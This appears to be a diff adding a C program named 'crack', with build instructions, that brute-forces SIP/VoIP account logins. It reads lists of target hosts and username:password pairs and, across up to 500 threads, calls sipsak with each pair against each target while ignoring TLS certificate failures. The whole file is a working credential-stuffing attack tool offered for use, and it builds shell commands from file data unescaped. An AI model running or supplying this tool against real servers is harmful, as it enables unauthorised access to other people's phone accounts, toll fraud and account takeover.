@@ -1,0 +1,84 @@
+gcc -o crack crack.c -lpthread
+./crack
+=====================================================
+
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <pthread.h>
+
+#define MAX_LINE 512
+#define MAX_THREADS 500  // Number of targets to be processed simultaneously
+#define COMMAND_SIZE 2048  // Increase the size of the command buffer
+
+typedef struct {
+    char target[MAX_LINE];
+} ThreadData;
+
+void *try_login(void *arg) {
+    ThreadData *data = (ThreadData *)arg;
+    char command[COMMAND_SIZE];
+    FILE *credentials = fopen("credentials.txt", "r");
+    char credential_line[MAX_LINE];
+
+    if (!credentials) {
+        perror("Failed to open credentials file");
+        free(data);
+        return NULL;
+    }
+
+    while (fgets(credential_line, sizeof(credential_line), credentials)) {
+        strtok(credential_line, "\n");  // Remove newline
+
+        char *username = strtok(credential_line, ":");
+        char *password = strtok(NULL, ":");
+
+        snprintf(command, sizeof(command), "sipsak -U -C sip:%s@home.com --from sip:%s@%s -u %s -a %s -p %s -s sip:%s@%s -i -vvv -E tls --tls-ignore-cert-failure",
+                 username, username, data->target, username, password, data->target, username, data->target);
+
+        system(command);
+    }
+
+    fclose(credentials);
+    free(data);
+    return NULL;
+}
+
+int main() {
+    FILE *targets = fopen("targets.txt", "r");
+    char target_line[MAX_LINE];
+
+    if (!targets) {
+        perror("Failed to open targets file");
+        return 1;
+    }
+
+    pthread_t threads[MAX_THREADS];
+    int current_thread = 0;
+
+    while (fgets(target_line, sizeof(target_line), targets)) {
+        strtok(target_line, "\n");  // Remove newline
+
+        ThreadData *data = malloc(sizeof(ThreadData));
+        strncpy(data->target, target_line, sizeof(data->target) - 1);
+
+        pthread_create(&threads[current_thread], NULL, try_login, data);
+        current_thread++;
+
+        if (current_thread >= MAX_THREADS) {
+            for (int i = 0; i < MAX_THREADS; i++) {
+                pthread_join(threads[i], NULL);
+            }
+            current_thread = 0;
+        }
+    }
+
+    // Join any remaining threads
+    for (int i = 0; i < current_thread; i++) {
+        pthread_join(threads[i], NULL);
+    }
+
+    fclose(targets);
+    return 0;
+}
